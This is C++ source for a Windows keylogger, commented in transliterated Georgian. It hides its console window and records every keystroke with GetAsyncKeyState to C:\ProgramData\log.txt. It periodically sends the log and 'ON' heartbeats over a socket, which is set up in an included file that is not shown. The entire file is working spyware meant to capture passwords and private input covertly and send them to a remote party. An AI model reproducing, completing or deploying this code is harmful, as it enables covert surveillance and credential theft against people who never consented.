// del.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <string>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#pragma comment (lib,"WS2_32.lib")
using namespace std;


#include"soketebi.cpp"


char *read(char *path);
int Save(int _key,char *file);
void keyloger()
{
	void *sock =CreateSoket(); ///// misamarti SOCK
	/////////////////////////////////////////////////////////
	int sendResult = send((unsigned __int64) sock,(const char*)"\n\rkeylogery chartulia",strlen("keylogery chartulia")+5,0);
	if(sendResult != SOCKET_ERROR)
		{

			unsigned int count=0;
			unsigned int CountOnOf=0;
			while(1)
			{			CountOnOf++;
						if(CountOnOf==300)
						{
							sendResult = send((unsigned __int64) sock,(const char*)"\n\rON\n\r",strlen("\n\rON\n\r")+1,0);
							CountOnOf=0;
						}
 					for(int i=1;i<=255;i++)
					{
						if(GetAsyncKeyState(i)==-32767)
						{
							count++;
							Save(i,"C:\\ProgramData\\log.txt");
				
						}
				
					}

					if(count>10)
					{
							printf("shemovidaa\n\n");
							char *bufffer=read("C:\\ProgramData\\log.txt");
				
									
								if(strlen(bufffer) > 5) ///    c_str utitebs  userInput ze misamartze rac weria anu send agzavnis orobitshi da cherez operatiulida akitxebs ororbitshi
								{
									int sendResult = send((unsigned __int64) sock,(const char*)"\n\n\n\r///////////////////////////////////////////////////////////////////////////////////////////\n\n\r",strlen("n\n\n\r///////////////////////////////////////////////////////////////////////////////////////////\n\n\r")+1,0);
										sendResult = send((unsigned __int64) sock,(const char*)bufffer,strlen(bufffer)+1,0);
										if(sendResult == SOCKET_ERROR)
										printf("ar gaigzavna");
								}

									count=0;

					}

					Sleep(50);

			}
	
	}

	
	WSACleanup();
	
}


int _tmain(int argc, _TCHAR* argv[])
{
	FreeConsole();


	keyloger();
	return 0;
}





int Save(int _key,char *file)
{
	cout<< _key<<endl;
	
	FILE *OUTPUT_FILE;
	OUTPUT_FILE=fopen(file,"a+");

	if(OUTPUT_FILE){
			if(_key==VK_SHIFT)
				fprintf(OUTPUT_FILE,"%s","");

			if(_key==VK_BACK)
				fprintf(OUTPUT_FILE,"%s","");

				if(_key==VK_LBUTTON)
				fprintf(OUTPUT_FILE,"%s","");

						if(_key==VK_RETURN)
				fprintf(OUTPUT_FILE,"%s","enter \n\r");

					if(_key==VK_ESCAPE)
				fprintf(OUTPUT_FILE,"%s","[ESCAPE]");
							if(_key==220)
				fprintf(OUTPUT_FILE,"%s","|");
									if(_key==221)
				fprintf(OUTPUT_FILE,"%c",']');
						if(_key==219)
				fprintf(OUTPUT_FILE,"%c",'[');

					if(_key>=97&&_key<=105)
					{
						if(_key==105)
						fprintf(OUTPUT_FILE,"%s","9");
									else if(_key==104)
						fprintf(OUTPUT_FILE,"%s","8");
									else if(_key==103)
						fprintf(OUTPUT_FILE,"%s","7");
									else if(_key==102)
						fprintf(OUTPUT_FILE,"%s","6");
									else if(_key==101)
						fprintf(OUTPUT_FILE,"%s","5");
									else if(_key==100)
						fprintf(OUTPUT_FILE,"%s","4");
									else if(_key==99)
						fprintf(OUTPUT_FILE,"%s","3");
									else if(_key==98)
						fprintf(OUTPUT_FILE,"%s","2");
									else if(_key==97)
						fprintf(OUTPUT_FILE,"%s","1");
					}
			else
			fprintf(OUTPUT_FILE,"%s",&_key);
	}
	fclose(OUTPUT_FILE);



	return 0;
}

char *read(char *path)
{	
	char buf[100];
	FILE *file;
	file=fopen(path,"rb");

	
	fseek(file,0,SEEK_END);
	int size=ftell(file);
	fseek(file,0,SEEK_SET);

	 char *cv;	
	 cv=( char*)malloc(size);
	
	if(cv==NULL){

	}
	else
		{
		//	while(fgetc(c,size, 1, file));
		fread(cv,size,1,file);
		cv[size]=0;
		fclose(file);
	}
		return (char*)cv;
}